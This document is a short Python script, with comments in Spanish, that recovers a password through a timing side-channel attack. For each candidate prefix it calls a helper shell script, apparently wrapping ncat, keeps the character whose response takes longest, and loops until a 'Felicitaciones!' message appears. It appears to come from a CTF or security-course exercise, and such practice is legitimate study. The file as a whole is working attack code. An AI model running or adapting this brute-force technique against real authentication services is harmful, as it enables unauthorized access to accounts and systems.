import subprocess

# Posibles caracteres de la passwd
CHARS = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789"

# Abro el archivo de output y lo dejo en blanco
outputFile = open("./output.txt", "w+")
outputFile.truncate(0)
# word contiene la passwd hasta el momento, empieza vacia, 
# para probar es "GaAVCK9r3K"
word = ""
# Mientras no este felicitaciones en el archivo de output, sigo buscando caracteres
while not 'Felicitaciones!' in outputFile.read():
    # Si no esta Felicitaciones vaciar el archivo(para que no se haga muy grande)
    # y cerrarlo
    outputFile.truncate(0)
    outputFile.close()
    # Contienen el delay maximo de esta corrida y el caracter que tuvo ese maximo delay
    maxDelay = 0
    maxDelayChar = ''
    for char in CHARS:
        # Corro ncat con la palabra que tenia hasta el momento + el nuevo 
        # caracter posible, leo la salida de la terminal que indica el tiempo
        #  que tardo en correrse el comando
        charTime = int(subprocess.run(['./script.sh', f'{word + char}'], stdout=subprocess.PIPE).stdout.decode('utf-8'))
        # Si tengo un nuevo maximo vuelvo a testear con el mismo 
        # char para ver que no haya sido suerte
        if charTime > maxDelay:
            charTime = int(subprocess.run(['./script.sh', f'{word + char}'], stdout=subprocess.PIPE).stdout.decode('utf-8'))
            #Si fue mayor dos veces asumo que no fue ruido
            maxDelay = max(charTime, maxDelay)
            if maxDelay == charTime:
                maxDelayChar = char
    # agrego el nuevo caracter a la passwd
    word += maxDelayChar
    # Abro el archivo para la proxima corrida del loop
    outputFile = open("./output.txt", "r+")
outputFile.close()
print(f"La contraseña es: {word}")
